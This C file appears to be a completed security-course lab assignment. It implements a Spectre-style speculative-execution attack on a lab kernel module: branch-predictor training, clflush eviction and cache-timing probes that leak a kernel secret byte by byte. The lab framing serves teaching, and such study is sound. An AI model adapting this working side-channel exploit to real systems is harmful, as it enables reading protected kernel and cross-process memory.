/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        // char leaked_byte;

        // [Part 3]- Fill this in!
        // leaked_byte = ??
        const uint64_t CACHE_HIT_THRESHOLD = 80;
        const int NUM_TRIES           = 10;   // repeat each byte this many times
        int histogram[256]            = {0};

        for (int attempt = 0; attempt < NUM_TRIES; attempt++) {
            /* (1) Train the branch predictor: 30× with an in‐bounds offset (0) */
            for (int train = 0; train < 30; train++) {
                call_kernel_part3(kernel_fd, shared_memory, 0);
            }

            /* (2) Evict all 256 pages of the shared buffer from the cache */
            for (int i = 0; i < 256; i++) {
                clflush(&shared_memory[i * 4096]);
            }

            /* (3) Trigger one out‐of‐bounds access – will be mispredicted speculatively */
            call_kernel_part3(kernel_fd, shared_memory, current_offset);

            /* (4) Reload+Reload: time‐probe each page and count any cache hits */
            for (int i = 0; i < 256; i++) {
                uint64_t t = time_access(&shared_memory[i * 4096]);
                if (t < CACHE_HIT_THRESHOLD) {
                    histogram[i]++;
                }
            }
        }

        /* Pick the byte that “won” the vote */
        int best_count = 0;
        char leaked_byte = '?';   // fallback if we saw no hits at all
        for (int i = 0; i < 256; i++) {
            if (histogram[i] > best_count) {
                best_count = histogram[i];
                leaked_byte = (char)i;
            }
        }
        
        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}
